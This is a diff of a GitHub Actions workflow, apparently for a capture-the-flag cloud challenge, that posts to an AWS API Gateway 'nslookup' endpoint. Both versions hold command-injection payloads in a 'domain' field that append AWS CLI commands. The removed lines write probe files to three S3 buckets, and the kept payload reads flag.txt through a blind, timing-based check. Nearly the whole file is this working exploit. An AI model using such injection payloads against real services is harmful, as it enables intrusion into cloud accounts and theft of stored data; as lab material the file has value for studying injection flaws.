@@ -1,4 +1,4 @@
-name: Stage2-12-Test-Lambda-S3-Permissions
+name: Stage2-12-Read-Flag-Test
 
 on:
   push:
@@ -24,7 +24,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Test Lambda role S3 permissions
+      - name: Test flag read permission
         run: |
           python3 - <<'PY'
           import os
@@ -32,10 +32,7 @@ jobs:
           import requests
           from requests_aws4auth import AWS4Auth
 
-          api = (
-              "https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-              "/dev/nslookup"
-          )
+          api = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
 
           auth = AWS4Auth(
               os.environ["AWS_ACCESS_KEY_ID"],
@@ -45,67 +42,29 @@ jobs:
               session_token=os.environ["AWS_SESSION_TOKEN"]
           )
 
-          tests = [
-              (
-                  "write_user_bucket",
-                  "example.com; "
-                  "printf CTF_PROBE > /tmp/ctf_probe; "
-                  "/opt/aws s3api put-object "
-                  "--bucket userad88e2b168aa387e "
-                  "--key ctf-probe.txt "
-                  "--body /tmp/ctf_probe "
-                  "--region us-east-1 "
-                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
-                  ">/tmp/aws_result 2>&1 && sleep 5"
-              ),
-              (
-                  "write_log_bucket",
-                  "example.com; "
-                  "printf CTF_PROBE > /tmp/ctf_probe; "
-                  "/opt/aws s3api put-object "
-                  "--bucket logad88e2b168aa387e "
-                  "--key ctf-probe.txt "
-                  "--body /tmp/ctf_probe "
-                  "--region us-east-1 "
-                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
-                  ">/tmp/aws_result 2>&1 && sleep 5"
-              ),
-              (
-                  "write_site_bucket",
-                  "example.com; "
-                  "printf CTF_PROBE > /tmp/ctf_probe; "
-                  "/opt/aws s3api put-object "
-                  "--bucket site781fe43f26b9eba3 "
-                  "--key ctf-probe.txt "
-                  "--body /tmp/ctf_probe "
-                  "--region us-east-1 "
-                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
-                  ">/tmp/aws_result 2>&1 && sleep 5"
-              ),
-              (
-                  "read_flag",
-                  "example.com; "
-                  "/opt/aws s3api get-object "
-                  "--bucket userad88e2b168aa387e "
-                  "--key flag.txt "
-                  "/tmp/flag.txt "
-                  "--region us-east-1 "
-                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
-                  ">/tmp/aws_result 2>&1 && sleep 5"
-              )
-          ]
+          domain = (
+              "example.com; "
+              "/opt/aws s3api get-object "
+              "--bucket userad88e2b168aa387e "
+              "--key flag.txt "
+              "/tmp/flag.txt "
+              "--region us-east-1 "
+              "--endpoint-url https://s3.us-east-1.amazonaws.com "
+              ">/tmp/aws_result 2>&1 && sleep 5"
+          )
 
-          for name, injected_domain in tests:
-              start = time.monotonic()
+          start = time.monotonic()
 
-              response = requests.post(
-                  api,
-                  json={"domain": injected_domain},
-                  auth=auth,
-                  timeout=20
-              )
+          response = requests.post(
+              api,
+              json={"domain": domain},
+              auth=auth,
+              timeout=20
+          )
 
-              elapsed = time.monotonic() - start
+          elapsed = time.monotonic() - start
 
-              print(f"TEST={name}")
-              print(f"HTTP={response.status
+          print("HTTP=" + str(response.status_code))
+          print("ELAPSED=%.2f" % elapsed)
+          print(response.text)
+          PY
